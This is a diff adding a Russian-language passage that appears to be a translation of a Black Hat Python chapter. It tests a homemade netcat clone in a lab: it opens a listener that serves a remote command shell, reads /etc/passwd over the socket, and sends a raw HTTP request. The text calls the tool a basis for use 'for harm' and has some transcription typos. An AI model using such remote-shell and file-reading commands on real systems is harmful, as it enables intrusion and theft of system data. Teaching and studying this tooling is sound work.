@@ -1,0 +1,108 @@
+Метод handle выполняет задание в соответствии с полученным аргументом командной строки: выполняет, загружает файл или
+запускает командную оболочку. Если нужно выпонить команду, метод handle передает ее функции execute и шлет вывод
+обратно в сокет. Если нужно загрузить файл, мы входим в цикл, чтобы получать данные из прослушивающего сокета,
+до тех пор пока они не перестанут поступать. Затем записываем накопленное содержимое в заданный файл. Наконец, если нужно
+создать командную оболочку, мы входим в цикл, передаем отправителю приглашение командной строки и ждем в ответ
+строку с командной. Затем выполняем команду с помощью функции execute и возвращаем ее вывод отправителю.
+
+Можно заметить, что в качестве сигнала для обработки команды командная оболочка ждет перевода строки, что делает ее
+совместимой с netcat. То есть вы можете использовать эту программу на стороне слущателя, а netcat - на стороне
+отправителя. Но если хотите общаться с ней помощью собственного клиента, написанного на Python, не забудьте добавить
+символ перевода строки. Как видите, мы сами это делаем в методе send после получения ввода из консоли.
+
+Проверка написанного
+Теперь поэкспериментируем с полученной программой и посмотрим, что она выводит. В одном терминале или командной
+оболочке cmd.exe запустите следующий скрипт с аргументом --help:
+
+$ python netcat.py --help
+usage: netcat.py [-h][-c][-e EXECUTE][-l][-p PORT][-t TARGET][-u UPLOAD]
+BHP Net Tool
+optional argumentsL
+-h, --help show this help  message and exit
+-c, --command initialize command shell
+-e EXECUTE, --exeecute EXECUTE execute specified command
+-l, --listen listen
+-p PORT, --port PORT specified port
+-t TARGET, --target TARGET specified IP
+-u UPLOAD, --upload UPLOAD upload file
+
+Example:
+netcat.py -t 192.168.1.108 -p 5555 -l -c # командная оболочка
+netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # загружаем в файл
+netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # выполняем команду
+echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135
+# шлем локальный текст на порт сервера 135
+netcat.py -t 192.168.1.108 -p 5555 # соединяемся с сервером
+
+ТЕперь перейдите в систему Kali и запустите слушателя с использованием собственного IP-адреса и порта 5555, чтобы
+предоставить доступ к командной оболочке:
+
+$ python netcat.py -t 192.168.1.203 -p 5555 -l -c
+
+Откройте еще один терминал в своей локальной системе и запустите скрипт в клиентском режиме. Помните, он читает
+из stdin до тех пор, пока не получит сигнал о конце файла (end-of-file, EOF). Чтобы послать EOF, нажмите на клавиатуре
+Ctrl+D:
+% python netcat.py -t 192.168.1.203 -p 5555
+CTRL+D
+<BHP:#> ls -la
+total 23497
+drwxr-xr-x 1 502 dialout 608 May 16 17:12 .
+drwxr-xr-x 1 502 dialout 512 Mar 29 11:23 ..
+-rw-r--r-- 1 502 dialout 5795 May 6 10:10 mytest.png
+-rw-r--r-- 1 502 dialout 14610 May 11 09:06 mytest.sh
+-rw-r--r-- 1 502 dialout 8795 May 6 10:10 mytest.txt
+-rw-r--r-- 1 502 dialput 4408 May 11 08:55 netcat.py
+<BHP: #> uname -a
+Linux kali 5.3.00-kali3-amd64 #1 SMP Debian 5.3.15-1kali1 (2019-12-09)
+x86_64 GNU/Linux
+
+Как видите, получили собственную командную оболочку. Поскольку мы находимся в системе Unix, то можем выполнять
+локальные команды и получать в ответ их вывод, как если бы все взаимодействие происходило через SSH или локальный
+терминал. Мы можем сделать то же самое в системе Kali, но так, чтобы она выполнила отдельную команду. Для этого
+воспользуемся паарметром -е:
+$ python netcat.py -t 192.168.1.203 -p 5555 -l -e="cat /etc/passwd"
+
+Теперь при подключении к Kali ил локальной системы мы получим в ответ вывод команды:
+
+% python netcat.py -t 192.168.1.203 -p 5555
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/user/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:gamesL/usr:games:/usr/sbin/nologin
+
+В локальной системе также можно было бы использовать netcat
+% nc 192.168.1.203 5555
+root:x:0:0:root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:6:games:/usr/games:/usr/sbin/nologin
+
+Наконец, мы могли бы воспользоваться клиентом для отправки запроса старым добрым способом:
+$ echo -ne "GET / HTTP/1.1\r\nHost: reachtim.com\r\n\r\n"
+|python ./netcat.py -t reachtim.com-p 80
+
+HTTP/1.1 301 Moved Permanently
+Serever: nginx
+Date: Mon, 18 May 2020 12:46:30 GMT
+Content-Type: text/html; charset-iso-8859-1
+Content-Length: 229
+Connection: keep-alive
+Location https://reachtim.com/
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="https://reachtim.com/">here</a>.</p>
+</body></html>
+
+Вот и все! Может, это и не самый изысканный подход, но он послужит хорошей основой для быстрого написания 
+клиентских и серверных советов на Python и использования их во вред. Конечно, эта программа охватывает лишь
+элементарные принципы; чтобы ее расширить или улучшить, воспользуйтесь воображением. Дальше мы напишем ТСР-прокси,
+который может пригодится для всевозможных атак.
